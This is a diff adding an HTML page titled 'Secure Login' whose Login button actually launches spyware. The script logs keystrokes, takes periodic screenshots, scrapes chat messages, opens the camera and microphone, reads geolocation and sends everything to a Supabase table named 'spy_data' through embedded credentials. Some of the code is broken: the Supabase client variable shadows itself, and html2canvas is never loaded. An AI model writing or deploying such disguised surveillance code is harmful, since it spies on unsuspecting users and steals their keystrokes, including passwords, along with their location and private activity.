@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Secure Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            width: 300px;
+            margin: 100px auto;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        h2 {
+            text-align: center;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Secure Login</h2>
+        <input type="text" id="username" placeholder="Username">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="startSpy()">Login</button>
+    </div>
+
+    <script>
+        // Your Supabase credentials
+        const supabaseUrl = 'https://muyevssqiuvhcozgxtlp.supabase.co';
+        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im11eWV2c3NxaXV2aGNvemd4dGxwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg0MTE4NTQsImV4cCI6MjA5Mzk4Nzg1NH0.jzN6V1UArKq5epxK3tTXuo1cGukH5oKD9qAi1FQWGUU';
+
+        // Initialize Supabase client
+        const supabase = supabase.createClient(supabaseUrl, supabaseKey);
+
+        // Start spying
+        function startSpy() {
+            // Keystroke logging
+            document.addEventListener('keydown', logKey);
+
+            // Screenshot capture
+            setInterval(captureScreenshot, 5000);
+
+            // Message monitoring
+            monitorMessages();
+
+            // Browser history tracking
+            trackBrowserHistory();
+
+            // Camera and microphone access
+            accessCameraMicrophone();
+
+            // Location tracking
+            trackLocation();
+
+            alert("Spyware started! All data will be sent to your dashboard.");
+        }
+
+        // Log keystrokes
+        function logKey(e) {
+            const key = e.key;
+            sendData({ type: 'key', data: key });
+        }
+
+        // Capture screenshot
+        function captureScreenshot() {
+            html2canvas(document.body).then(canvas => {
+                const image = canvas.toDataURL("image/png");
+                sendData({ type: 'screenshot', data: image });
+            });
+        }
+
+        // Monitor messages (example: chat messages)
+        function monitorMessages() {
+            // This would need to be adapted based on the chat platform
+            setInterval(() => {
+                const messages = document.querySelectorAll('.chat-message');
+                messages.forEach(msg => {
+                    sendData({ type: 'message', data: msg.textContent });
+                });
+            }, 5000);
+        }
+
+        // Track browser history
+        function trackBrowserHistory() {
+            window.addEventListener('beforeunload', () => {
+                const history = window.history;
+                sendData({ type: 'history', data: history.length });
+            });
+        }
+
+        // Access camera and microphone
+        function accessCameraMicrophone() {
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    setInterval(() => {
+                        sendData({ type: 'camera', data: 'Camera active' });
+                    }, 5000);
+                })
+                .catch(err => {
+                    console.error("Error accessing camera/microphone:", err);
+                });
+        }
+
+        // Track location
+        function trackLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    sendData({ type: 'location', data: `${position.coords.latitude}, ${position.coords.longitude}` });
+                });
+            } else {
+                console.error("Geolocation is not supported by this browser.");
+            }
+        }
+
+        // Send data to Supabase
+        function sendData(data) {
+            supabase.from('spy_data').insert([data]).then((response) => {
+                console.log('Data sent:', response);
+            }).catch((error) => {
+                console.error('Error sending data:', error);
+            });
+        }
+    </script>
+</body>
+</html>
